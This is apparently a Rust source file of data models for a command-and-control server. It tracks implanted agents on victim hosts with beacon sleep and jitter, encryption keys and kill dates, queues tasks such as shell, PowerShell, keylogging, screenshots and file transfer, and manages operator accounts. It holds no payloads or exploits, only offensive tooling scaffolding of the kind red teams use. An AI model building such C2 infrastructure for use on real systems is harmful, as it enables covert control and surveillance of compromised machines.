use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Agent {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub arch: String,
    pub process_id: u32,
    pub process_name: String,
    pub integrity_level: String,
    pub remote_ip: String,
    pub internal_ip: String,
    pub last_seen: DateTime<Utc>,
    pub first_seen: DateTime<Utc>,
    pub sleep_interval: u64, // seconds between check-ins
    pub jitter: f32,         // percentage of sleep_interval to randomize
    pub is_active: bool,
    pub encryption_key: String, // Base64 encoded AES key
}

impl Agent {
    pub fn new(
        hostname: String,
        username: String,
        domain: String,
        os: String,
        arch: String,
        process_id: u32,
        process_name: String,
        integrity_level: String,
        remote_ip: String,
        internal_ip: String,
        sleep_interval: u64,
        jitter: f32,
        encryption_key: String,
    ) -> Self {
        let now = Utc::now();
        Agent {
            id: Uuid::new_v4().to_string(),
            hostname,
            username,
            domain,
            os,
            arch,
            process_id,
            process_name,
            integrity_level,
            remote_ip,
            internal_ip,
            last_seen: now,
            first_seen: now,
            sleep_interval,
            jitter,
            is_active: true,
            encryption_key,
        }
    }

    pub fn update_checkin(&mut self) {
        self.last_seen = Utc::now();
        self.is_active = true;
    }

    pub fn mark_inactive(&mut self) {
        self.is_active = false;
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Task {
    pub id: String,
    pub agent_id: String,
    pub command: String,
    pub arguments: Vec<String>,
    pub task_type: TaskType,
    pub created_at: DateTime<Utc>,
    pub assigned_at: Option<DateTime<Utc>>,
    pub status: TaskStatus,
    pub priority: TaskPriority,
    pub timeout: Option<u64>, // seconds
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum TaskType {
    Shell,
    PowerShell,
    Download,
    Upload,
    Screenshot,
    Keylog,
    ProcessList,
    SystemInfo,
    NetworkInfo,
    FileList,
    Registry,
    Sleep,
    Jitter,
    Exit,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum TaskStatus {
    Pending,
    Assigned,
    Running,
    Completed,
    Failed,
    Timeout,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum TaskPriority {
    Low,
    Normal,
    High,
    Critical,
}

impl Task {
    pub fn new(
        agent_id: String,
        command: String,
        arguments: Vec<String>,
        task_type: TaskType,
    ) -> Self {
        Task {
            id: Uuid::new_v4().to_string(),
            agent_id,
            command,
            arguments,
            task_type,
            created_at: Utc::now(),
            assigned_at: None,
            status: TaskStatus::Pending,
            priority: TaskPriority::Normal,
            timeout: Some(300), // 5 minutes default
        }
    }

    pub fn assign(&mut self) {
        self.assigned_at = Some(Utc::now());
        self.status = TaskStatus::Assigned;
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct TaskResult {
    pub id: String,
    pub task_id: String,
    pub agent_id: String,
    pub output: String,
    pub error: Option<String>,
    pub exit_code: Option<i32>,
    pub execution_time: f64, // milliseconds
    pub completed_at: DateTime<Utc>,
    pub file_data: Option<Vec<u8>>, // For file downloads/screenshots
}

impl TaskResult {
    pub fn new(
        task_id: String,
        agent_id: String,
        output: String,
        error: Option<String>,
        exit_code: Option<i32>,
        execution_time: f64,
    ) -> Self {
        TaskResult {
            id: Uuid::new_v4().to_string(),
            task_id,
            agent_id,
            output,
            error,
            exit_code,
            execution_time,
            completed_at: Utc::now(),
            file_data: None,
        }
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Operator {
    pub id: String,
    pub username: String,
    pub password_hash: String,
    pub role: OperatorRole,
    pub created_at: DateTime<Utc>,
    pub last_login: Option<DateTime<Utc>>,
    pub is_active: bool,
    pub failed_login_attempts: u32,
    pub locked_until: Option<DateTime<Utc>>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum OperatorRole {
    Admin,
    Operator,
    ReadOnly,
}

impl Operator {
    pub fn new(username: String, password_hash: String, role: OperatorRole) -> Self {
        Operator {
            id: Uuid::new_v4().to_string(),
            username,
            password_hash,
            role,
            created_at: Utc::now(),
            last_login: None,
            is_active: true,
            failed_login_attempts: 0,
            locked_until: None,
        }
    }

    pub fn authenticate(&mut self) {
        self.last_login = Some(Utc::now());
        self.failed_login_attempts = 0;
        self.locked_until = None;
    }

    pub fn failed_login(&mut self) {
        self.failed_login_attempts += 1;
        if self.failed_login_attempts >= 5 {
            self.locked_until = Some(Utc::now() + chrono::Duration::hours(1));
        }
    }

    pub fn is_locked(&self) -> bool {
        if let Some(locked_until) = self.locked_until {
            Utc::now() < locked_until
        } else {
            false
        }
    }
}

// Communication structures for encrypted messages
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct EncryptedMessage {
    pub nonce: String,      // Base64 encoded nonce
    pub ciphertext: String, // Base64 encoded encrypted data
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct BeaconRequest {
    pub agent_id: String,
    pub encrypted_payload: EncryptedMessage,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct BeaconResponse {
    pub tasks: Vec<Task>,
    pub new_sleep: Option<u64>,
    pub new_jitter: Option<f32>,
    pub kill_date: Option<DateTime<Utc>>,
    pub encrypted_payload: EncryptedMessage,
}

// Internal beacon data (decrypted)
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct BeaconData {
    pub hostname: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub arch: String,
    pub process_id: u32,
    pub process_name: String,
    pub integrity_level: String,
    pub internal_ip: String,
    pub working_directory: String,
    pub system_info: Option<String>,
}

// Registry to manage all components
#[derive(Clone)]
pub struct C2Registry {
    pub agents: Vec<Agent>,
    pub tasks: Vec<Task>,
    pub results: Vec<TaskResult>,
    pub operators: Vec<Operator>,
}

impl C2Registry {
    pub fn new() -> Self {
        C2Registry {
            agents: Vec::new(),
            tasks: Vec::new(),
            results: Vec::new(),
            operators: Vec::new(),
        }
    }

    // Agent methods
    pub fn add_agent(&mut self, agent: Agent) {
        self.agents.push(agent);
    }

    pub fn get_agent(&self, id: &str) -> Option<&Agent> {
        self.agents.iter().find(|agent| agent.id == id)
    }

    pub fn get_agent_mut(&mut self, id: &str) -> Option<&mut Agent> {
        self.agents.iter_mut().find(|agent| agent.id == id)
    }

    pub fn update_agent_checkin(&mut self, id: &str) {
        if let Some(agent) = self.get_agent_mut(id) {
            agent.update_checkin();
        }
    }

    pub fn update_agent(&mut self, id: &str, updated_agent: Agent) {
        if let Some(index) = self.agents.iter().position(|agent| agent.id == id) {
            self.agents[index] = updated_agent;
        }
    }

    pub fn remove_agent(&mut self, id: &str) {
        if let Some(index) = self.agents.iter().position(|agent| agent.id == id) {
            self.agents.remove(index);
        }
    }

    pub fn list_agents(&self) -> &Vec<Agent> {
        &self.agents
    }

    pub fn list_active_agents(&self) -> Vec<&Agent> {
        self.agents.iter().filter(|agent| agent.is_active).collect()
    }

    // Task methods
    pub fn add_task(&mut self, task: Task) {
        self.tasks.push(task);
    }

    pub fn get_pending_tasks_for_agent(&self, agent_id: &str) -> Vec<&Task> {
        self.tasks
            .iter()
            .filter(|task| task.agent_id == agent_id && matches!(task.status, TaskStatus::Pending))
            .collect()
    }

    pub fn assign_task(&mut self, task_id: &str) {
        if let Some(task) = self.tasks.iter_mut().find(|task| task.id == task_id) {
            task.assign();
        }
    }

    pub fn complete_task(&mut self, task_id: &str) {
        if let Some(task) = self.tasks.iter_mut().find(|task| task.id == task_id) {
            task.status = TaskStatus::Completed;
        }
    }

    // Result methods
    pub fn add_result(&mut self, result: TaskResult) {
        self.results.push(result);
    }

    pub fn get_results_for_agent(&self, agent_id: &str) -> Vec<&TaskResult> {
        self.results
            .iter()
            .filter(|result| result.agent_id == agent_id)
            .collect()
    }

    // Operator methods
    pub fn add_operator(&mut self, operator: Operator) {
        self.operators.push(operator);
    }

    pub fn get_operator_by_username(&self, username: &str) -> Option<&Operator> {
        self.operators.iter().find(|op| op.username == username)
    }

    pub fn get_operator_by_username_mut(&mut self, username: &str) -> Option<&mut Operator> {
        self.operators.iter_mut().find(|op| op.username == username)
    }
}
